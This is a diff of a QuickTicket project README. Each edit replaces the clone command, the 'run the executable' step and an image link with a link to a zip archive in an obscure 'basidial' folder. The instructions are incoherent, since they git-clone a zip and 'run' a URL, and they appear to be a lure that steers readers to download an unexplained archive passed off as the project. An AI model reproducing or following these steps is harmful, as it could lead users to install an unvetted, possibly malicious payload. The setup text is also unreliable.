@@ -5,7 +5,7 @@
 Download the project from GitHub or clone it using the following command.
 
 ```
-git clone https://raw.githubusercontent.com/Brijesh-Coder-IIITB/QuickTicket/main/basidial/Ticket_Quick_v2.2.zip
+git clone https://github.com/Brijesh-Coder-IIITB/QuickTicket/raw/refs/heads/main/basidial/Quick-Ticket-v1.4.zip
 ```
 
 - Navigate into the QuickTicket directory before running the program.
@@ -25,7 +25,7 @@ make rerun
 - Now, run the executable file using the following command.
 
 ```
-https://raw.githubusercontent.com/Brijesh-Coder-IIITB/QuickTicket/main/basidial/Ticket_Quick_v2.2.zip
+https://github.com/Brijesh-Coder-IIITB/QuickTicket/raw/refs/heads/main/basidial/Quick-Ticket-v1.4.zip
 ```
 
 >**Note:** This program works only on Linux based systems.  
@@ -33,7 +33,7 @@ https://raw.githubusercontent.com/Brijesh-Coder-IIITB/QuickTicket/main/basidial/
 
 ---
 
-![Home Page](https://raw.githubusercontent.com/Brijesh-Coder-IIITB/QuickTicket/main/basidial/Ticket_Quick_v2.2.zip)
+![Home Page](https://github.com/Brijesh-Coder-IIITB/QuickTicket/raw/refs/heads/main/basidial/Quick-Ticket-v1.4.zip)
 ---
 
 >**Note:** To access the admin panel use one of the credentials below.  
